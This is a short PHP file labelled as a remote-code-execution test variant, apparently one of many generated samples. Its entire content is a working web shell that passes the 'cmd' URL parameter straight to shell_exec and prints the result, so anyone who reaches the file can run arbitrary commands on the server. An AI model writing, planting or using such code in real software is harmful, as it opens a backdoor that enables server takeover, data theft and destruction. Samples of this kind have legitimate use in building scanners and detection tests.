<?php
// RCE test variation #842
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>